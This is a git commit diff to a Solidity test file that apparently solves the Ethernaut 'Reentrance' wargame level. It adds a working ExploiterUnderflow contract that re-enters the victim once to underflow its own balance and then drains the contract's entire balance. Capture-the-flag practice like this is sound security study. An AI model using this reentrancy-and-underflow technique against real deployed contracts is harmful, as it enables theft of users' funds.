62a82d6538d8a010655ae3b40de252f0d0e85adb
StErMi <stermi@gmail.com>
2022-07-19 10:34:34 +0200

    Updated Reentrance solution adding a second option

--- test/Reentrance.t.sol
+++ test/Reentrance.t.sol
@@ -65,11 +65,19 @@ contract TestReentrance is BaseTest {
         uint256 levelBalance = address(level).balance;
 
         // Deploy our exploiter contract
-        Exploiter exploiter = new Exploiter(level);
+        // ExploiterLoop exploiter = new ExploiterLoop(level);
 
         // start the exploit
-        exploiter.exploit{value: levelBalance / 100}();
+        // exploiter.exploit{value: levelBalance / 100}();
 
+        // withdraw all the funds
+        // exploiter.withdraw();
+
+        // Exploit by using a mix of reentrancy and underflow
+        // Deploy our exploiter contract
+        ExploiterUnderflow exploiter = new ExploiterUnderflow(level);
+        // start the exploit
+        exploiter.exploit{value: 1}();
         // withdraw all the funds
         exploiter.withdraw();
 
@@ -83,7 +91,7 @@ contract TestReentrance is BaseTest {
     }
 }
 
-contract Exploiter {
+contract ExploiterLoop {
     Reentrance private victim;
     address private owner;
 
@@ -123,6 +131,51 @@ contract Exploiter {
                 withdrawAmount = victimBalance;
             }
             victim.withdraw(withdrawAmount);
+        }
+    }
+}
+
+contract ExploiterUnderflow {
+    Reentrance private victim;
+    address private owner;
+    uint256 private initialDonation;
+    bool private exploited;
+
+    constructor(Reentrance _victim) public {
+        owner = msg.sender;
+        victim = _victim;
+        exploited = false;
+    }
+
+    function withdraw() external {
+        uint256 balance = address(this).balance;
+        (bool success, ) = owner.call{value: balance}("");
+        require(success, "withdraw failed");
+    }
+
+    function exploit() external payable {
+        require(msg.value > 0, "donate something!");
+        initialDonation = msg.value;
+
+        // donate 1 wei to ourself
+        victim.donate{value: msg.value}(address(this));
+
+        // withdraw 1 way and trigger the re-entrancy exploit
+        victim.withdraw(initialDonation);
+
+        // because the victim contract underflowed our balance
+        // we are now able to drain the whole balance of the contract
+        victim.withdraw(address(victim).balance);
+    }
+
+    receive() external payable {
+        // We need to re-enter only once
+        // By re-entering our new balance will be equal to (2^256)-1
+        if (!exploited) {
+            exploited = true;
+
+            // re-enter the contract withdrawing another wei
+            victim.withdraw(initialDonation);
         }
     }
 }
